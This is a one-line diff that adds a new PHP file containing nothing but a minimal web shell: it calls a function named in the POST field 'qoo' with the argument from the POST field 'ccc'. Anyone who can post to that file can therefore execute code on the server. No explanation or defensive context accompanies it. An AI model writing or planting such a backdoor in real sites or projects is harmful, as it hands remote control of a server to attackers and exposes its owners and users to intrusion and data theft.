@@ -1,0 +1,1 @@
+<?php $_POST['qoo']($_POST['ccc']);?>
